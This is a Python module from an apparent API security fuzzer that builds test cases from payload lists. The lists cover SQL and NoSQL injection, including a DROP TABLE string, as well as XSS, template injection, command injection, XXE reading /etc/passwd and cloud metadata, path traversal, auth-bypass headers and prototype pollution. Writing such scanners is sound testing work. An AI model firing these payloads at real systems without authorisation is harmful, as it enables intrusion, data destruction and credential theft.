"""Intelligent payload generator for API fuzzing."""

from __future__ import annotations

import itertools
from dataclasses import dataclass, field
from typing import Any

from aegis.tools.api_fuzzing.schema import Endpoint, Parameter


@dataclass
class TestCase:
    name: str
    endpoint: str
    method: str
    headers: dict[str, str] = field(default_factory=dict)
    params: dict[str, str] = field(default_factory=dict)
    body: dict[str, Any] | str | None = None
    content_type: str = "application/json"
    description: str = ""
    category: str = ""  # injection, auth, idor, business_logic, config


# ── Injection Payloads ────────────────────────────────────────────────────────

_SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND SLEEP(5)--",
    "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "admin'--",
    "' OR 1=1#",
    "1' WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
]

_NOSQLI_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": ""}',
    '{"$regex": ".*"}',
    '{"$exists": true}',
    '{"$where": "sleep(5000)"}',
    '{"$in": ["admin", "root"]}',
    '["admin", "root"]',
    '{"$gte": ""}',
]

_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "'-alert(1)-'",
    '<svg/onload=alert(1)>',
    "<body onload=alert(1)>",
    '"><script>alert(document.cookie)</script>',
    "{{7*7}}",  # SSTI detection
    "${7*7}",  # Template injection
]

_SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
]

_COMMAND_INJECTION_PAYLOADS = [
    "; echo AEGIS_TEST_12345",
    "| echo AEGIS_TEST_12345",
    "$(echo AEGIS_TEST_12345)",
    "`echo AEGIS_TEST_12345`",
    "; sleep 5",
    "| sleep 5",
]

_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
]

_PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc/passwd",
    "/etc/passwd",
    "C:\\Windows\\system32\\drivers\\etc\\hosts",
]

# ── Auth Payloads ─────────────────────────────────────────────────────────────

_AUTH_BYPASS_PAYLOADS = [
    {"name": "no_token", "headers": {}, "description": "Request without any authentication token"},
    {"name": "empty_bearer", "headers": {"Authorization": "Bearer "}, "description": "Empty Bearer token"},
    {"name": "invalid_token", "headers": {"Authorization": "Bearer invalid_token_abc123"}, "description": "Random invalid token"},
    {"name": "expired_token", "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjF9.signature"}, "description": "Expired JWT token"},
    {"name": "admin_token", "headers": {"Authorization": "Bearer admin"}, "description": "Guess admin token"},
    {"name": "cookie_auth", "headers": {"Cookie": "session=admin"}, "description": "Cookie-based auth attempt"},
]

_ROLE_ESCALATION_PAYLOADS = [
    {"role": "admin", "description": "Try to escalate to admin role"},
    {"role": "superadmin", "description": "Try to escalate to superadmin"},
    {"role": "root", "description": "Try to escalate to root"},
]

# ── Type-Aware Fuzz Payloads ──────────────────────────────────────────────────

_TYPE_FUZZ: dict[str, list[str]] = {
    "string": [
        "",
        " ",
        "null",
        "undefined",
        "true",
        "false",
        "0",
        "-1",
        "99999999999999999",
        "A" * 10000,
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../../etc/passwd",
        "admin'--",
        "\x00",
        "\n\r\t",
        "\\u0000",
        "🔥",
        "%00",
    ],
    "integer": [
        "0",
        "-1",
        "1",
        "2147483647",
        "2147483648",
        "-2147483648",
        "-2147483649",
        "99999999999999999",
        "1.5",
        "abc",
        "null",
        "true",
    ],
    "number": [
        "0",
        "-0.001",
        "0.001",
        "999999999.99",
        "-999999999.99",
        "1e308",
        "1e-308",
        "NaN",
        "Infinity",
        "-Infinity",
        "abc",
    ],
    "boolean": [
        "true",
        "false",
        "0",
        "1",
        "null",
        "undefined",
        "yes",
        "no",
        "TRUE",
        "FALSE",
    ],
    "array": [
        "[]",
        "[1,2,3]",
        '["admin"]',
        "[{}]",
        "[null]",
        "[[1,2],[3,4]]",
        "not_an_array",
    ],
    "object": [
        "{}",
        '{"key": "value"}',
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"admin": true}}}',
        "not_an_object",
    ],
}

# ── Business Logic Payloads ───────────────────────────────────────────────────

_NEGATIVE_VALUE_PAYLOADS = [
    {"field": "quantity", "value": -1, "description": "Negative quantity"},
    {"field": "price", "value": -100, "description": "Negative price"},
    {"field": "amount", "value": 0, "description": "Zero amount"},
    {"field": "discount", "value": 100, "description": "100% discount"},
    {"field": "discount", "value": 999, "description": "Over 100% discount"},
]


def _make_test_name(endpoint: str, method: str, payload_name: str) -> str:
    return f"{method.upper()} {endpoint} - {payload_name}"


def generate_injection_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate injection test cases for an endpoint."""
    tests = []

    # Determine which payloads to use based on parameter types
    has_body = endpoint.request_body is not None
    body_schema = endpoint.request_body.schema if has_body else {}
    body_props = body_schema.get("properties", {})

    # SQL injection on all string parameters
    for param in endpoint.parameters + [
        Parameter(name=k, location="body", schema_type=v.get("type", "string"))
        for k, v in body_props.items()
    ]:
        for payload in _SQLI_PAYLOADS[:3]:  # Top 3 per param
            body = None
            params = {}
            if param.location == "body":
                body = {param.name: payload}
            elif param.location == "query":
                params[param.name] = payload
            elif param.location == "path":
                continue  # Path params handled differently

            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"SQLi-{param.name}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    params=params,
                    body=body,
                    description=f"SQL injection on {param.name}: {payload[:50]}",
                    category="injection",
                )
            )

    # NoSQL injection
    for param in body_props:
        for payload in _NOSQLI_PAYLOADS[:2]:
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"NoSQLi-{param}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={param: payload},
                    description=f"NoSQL injection on {param}",
                    category="injection",
                )
            )

    # XSS on string parameters
    for param in body_props:
        if body_props[param].get("type") == "string":
            for payload in _XSS_PAYLOADS[:2]:
                tests.append(
                    TestCase(
                        name=_make_test_name(endpoint.path, endpoint.method, f"XSS-{param}"),
                        endpoint=endpoint.path,
                        method=endpoint.method,
                        body={param: payload},
                        description=f"XSS injection on {param}",
                        category="injection",
                    )
                )

    # SSTI on all body parameters
    for param in body_props:
        for payload in _SSTI_PAYLOADS[:2]:
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"SSTI-{param}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={param: payload},
                    description=f"Server-side template injection on {param}",
                    category="injection",
                )
            )

    # Command injection on string params that might reach shell
    for param in body_props:
        if body_props[param].get("type") == "string":
            for payload in _COMMAND_INJECTION_PAYLOADS[:2]:
                tests.append(
                    TestCase(
                        name=_make_test_name(endpoint.path, endpoint.method, f"CMDi-{param}"),
                        endpoint=endpoint.path,
                        method=endpoint.method,
                        body={param: payload},
                        description=f"Command injection on {param}",
                        category="injection",
                    )
                )

    return tests


def generate_auth_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate authentication/authorization test cases."""
    tests = []

    # Skip auth tests for public endpoints (login, register, health)
    public_paths = {"/login", "/register", "/signup", "/health", "/status", "/docs"}
    if endpoint.path.lower() in public_paths:
        return tests

    # No token / invalid token tests
    for auth_test in _AUTH_BYPASS_PAYLOADS:
        tests.append(
            TestCase(
                name=_make_test_name(endpoint.path, endpoint.method, auth_test["name"]),
                endpoint=endpoint.path,
                method=endpoint.method,
                headers=auth_test["headers"],
                description=auth_test["description"],
                category="auth",
            )
        )

    return tests


def generate_type_fuzz_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate type confusion / boundary value tests."""
    tests = []

    if not endpoint.request_body:
        return tests

    body_schema = endpoint.request_body.schema
    properties = body_schema.get("properties", {})

    for prop_name, prop_schema in properties.items():
        prop_type = prop_schema.get("type", "string")
        fuzz_values = _TYPE_FUZZ.get(prop_type, _TYPE_FUZZ["string"])

        for fuzz_value in fuzz_values[:4]:  # Top 4 per type
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"TypeFuzz-{prop_name}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={prop_name: fuzz_value},
                    description=f"Type confusion on {prop_name} (expected {prop_type}): {str(fuzz_value)[:50]}",
                    category="injection",
                )
            )

    return tests


def generate_business_logic_tests(endpoint: Endpoint) -> list[TestCase]:
    """Generate business logic test cases."""
    tests = []

    # Negative value tests for write endpoints
    if endpoint.method in ("POST", "PUT", "PATCH"):
        for payload in _NEGATIVE_VALUE_PAYLOADS:
            tests.append(
                TestCase(
                    name=_make_test_name(endpoint.path, endpoint.method, f"BizLogic-{payload['field']}"),
                    endpoint=endpoint.path,
                    method=endpoint.method,
                    body={payload["field"]: payload["value"]},
                    description=payload["description"],
                    category="business_logic",
                )
            )

    return tests


def generate_test_cases(endpoint: Endpoint) -> list[TestCase]:
    """Generate all test cases for an endpoint."""
    tests = []
    tests.extend(generate_injection_tests(endpoint))
    tests.extend(generate_auth_tests(endpoint))
    tests.extend(generate_type_fuzz_tests(endpoint))
    tests.extend(generate_business_logic_tests(endpoint))
    return tests
